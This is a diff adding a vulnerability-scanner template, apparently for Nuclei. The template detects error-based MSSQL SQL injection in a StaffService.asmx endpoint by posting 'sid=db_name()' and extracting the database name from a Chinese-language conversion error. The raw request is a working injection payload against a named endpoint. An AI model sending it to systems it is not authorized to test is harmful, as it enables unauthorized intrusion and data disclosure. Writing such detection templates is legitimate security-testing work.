@@ -1,0 +1,39 @@
+id: mssql-sqli-error-based-dbname
+
+info:
+  name: MSSQL Error-Based SQL Injection - GetPositionOfStaff
+  author: yourname
+  severity: high
+  description: Detects SQL injection vulnerability in /WebService/StaffService.asmx/GetPositionOfStaff via sid parameter by triggering a type conversion error with db_name().
+  reference:
+    - https://example.com/nday-poc
+  tags: sqli,mssql,iis,aspnet
+
+requests:
+  - raw:
+      - |
+        POST /WebService/StaffService.asmx/GetPositionOfStaff HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 11
+
+        sid=db_name()
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "在将 .nvarchar 值 '"
+          - "转换成数据类型 int 时失败"
+        condition: and
+
+      - type: status
+        status:
+          - 500
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "在将 \\.nvarchar 值 '([^']+)' 转换成数据类型 int 时失败"
